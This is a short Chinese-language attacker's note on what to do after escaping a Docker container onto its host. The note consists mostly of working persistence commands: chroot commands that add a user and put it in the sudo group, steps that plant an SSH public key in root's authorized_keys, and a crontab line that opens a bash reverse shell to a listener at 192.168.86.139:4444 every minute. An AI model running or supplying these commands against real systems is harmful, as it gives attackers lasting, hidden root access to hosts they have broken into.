逃逸成功之后操作---docker

2023年12月2日

14:20

 

逃逸成功

后续操作

1、添加用户

2、写入ssh key

3、计划任务

 

1、添加用户

chroot /test1 adduser john

逃逸得目录 添加用户 用户名

 

\# 将用户 john 添加到 sudo 组

chroot /test1 /usr/sbin/usermod -aG sudo john

 

![image-20231202152434323](./assets/image-20231202152434323.png)

 

![image-20231202152437567](./assets/image-20231202152437567.png)

登录：ssh john@your_server_ip

sudo -s

![image-20231202152441825](./assets/image-20231202152441825.png)

 

 

2、写入ssh key密钥登录

cd /test1/root/.ssh 到root ssh目录

 

本机执行：ssh-keygen -t ed25519 -N "123456"

N是密码

![image-20231202152445751](./assets/image-20231202152445751.png)

在目标机器插件authorized_keys文件

cat id_ed25519.pub

![image-20231202152450127](./assets/image-20231202152450127.png)

 

目标机器执行下面：

cat \>\> authorized_keys \<\< EOF

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIQVnh0Y2GhCxrEE7BSPPsN0oI13luK+r0yFZBidahtJ root@master-1

EOF

![image-20231202152453611](./assets/image-20231202152453611.png)

ssh -i id_ed25519 root@192.168.86.218

![image-20231202152457511](./assets/image-20231202152457511.png)

 

3、计划任务反弹shell【根据对方系统不同，反弹shell命令不同】

echo -e "\* \* \* \* \* root bash -i \>& /dev/tcp/192.168.86.139/4444 0\>&1\\n" \>\> /test1/etc/crontab

![image-20231202152501328](./assets/image-20231202152501328.png)

 
